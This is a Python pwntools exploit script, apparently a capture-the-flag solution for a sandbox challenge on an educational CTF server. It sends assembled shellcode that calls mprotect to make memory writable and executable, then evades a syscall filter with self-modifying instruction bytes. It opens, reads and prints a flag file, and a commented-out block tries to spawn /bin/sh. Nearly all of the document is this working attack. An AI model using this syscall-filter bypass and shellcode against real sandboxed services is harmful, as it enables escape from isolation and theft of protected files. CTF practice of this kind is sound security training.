from pwn import *

context.arch = "amd64"
context.terminal = ['tmux', 'splitw', '-h']

FLAG_LENGTH = 0x20
FLAG_PATH = "/home/sandbox/flag" 

# For Debug Purpose
# r = process("./sandbox/share/sandbox")
r = remote("edu-ctf.zoolab.org", 30202)

# Prepare My Shellcode
FAKE_SYSCALL = b"\x0E\x05"
FAKE_SYSCALL_inc = "inc BYTE PTR [rip]\n"
shellcode = ""

# Leak mprotect position
shellcode += "push QWORD PTR [rip + 9]\n"
shellcode += "mov rax, 40\n syscall\n"

# Prepare MProtect to Change Priviledge to RWX
shellcode += "pop r8\n"
shellcode += "pop rdi\n sub rdi, 0x19\n"
shellcode += shellcraft.mov("rsi", 0x1000)
shellcode += shellcraft.mov("rdx", 0x7)
shellcode += "sub r8, 265\npush r8\n"
shellcode += "call QWORD PTR [rsp]\n"

# Not Work Shell ... IDK WHY
# shellcode += "push 0\n"
# shellcode += shellcraft.pushstr("/bin/sh")
# shellcode += shellcraft.mov("rdi", "rsp")
# shellcode += shellcraft.mov("rax", "rsp")
# shellcode += " rax\n"
# shellcode += "add rax, 0x10\n"
# shellcode += "push rax\n"
# shellcode += shellcraft.mov("rsi", "rsp")
# shellcode += shellcraft.mov("rdx", 0)
# shellcode += shellcraft.mov("rax", 59);
# shellcode += FAKE_SYSCALL_inc

# open
shellcode += shellcraft.pushstr(FLAG_PATH)
shellcode += shellcraft.mov("rax", 2)
shellcode += shellcraft.mov("rdi", "rsp")
shellcode += shellcraft.mov("rsi", 0)
shellcode += shellcraft.mov("rdx", 0)
shellcode += FAKE_SYSCALL_inc

# read
read_shell = shellcraft.mov("r8", "rsp")
read_shell += "add r8, 0x20\n"
read_shell += shellcraft.mov("rax", 0)
read_shell += shellcraft.mov("rdi", 3)
read_shell += shellcraft.mov("rsi", "r8")
read_shell += shellcraft.mov("rdx", FLAG_LENGTH)
read_shell += FAKE_SYSCALL_inc

# write
write_shell = shellcraft.mov("rax", 1)
write_shell += shellcraft.mov("rdi", 1)
write_shell += shellcraft.mov("rsi", "r8")
write_shell += shellcraft.mov("rdx", FLAG_LENGTH)
write_shell += FAKE_SYSCALL_inc

payload = b"\xe8\x00\x00\x00\x00" + asm(shellcode) + FAKE_SYSCALL + asm(read_shell) + FAKE_SYSCALL + asm(write_shell) + FAKE_SYSCALL

# gdb.attach(r, "b *main+968")

r.send(payload)

print(r.recvall().decode())
